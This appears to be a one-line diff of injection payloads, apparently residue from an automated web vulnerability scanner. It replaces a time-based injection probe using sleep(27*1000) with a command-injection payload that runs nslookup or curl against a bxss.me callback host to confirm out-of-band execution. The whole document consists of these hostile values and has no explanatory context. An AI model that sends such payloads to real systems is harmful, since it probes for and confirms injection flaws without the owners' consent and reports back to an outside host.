@@ -1,1 +1,1 @@
-555'&&sleep(27*1000)*ttngjo&&'
+(nslookup -q=cname hitxwdrhykisu75f5e.bxss.me||curl hitxwdrhykisu75f5e.bxss.me))
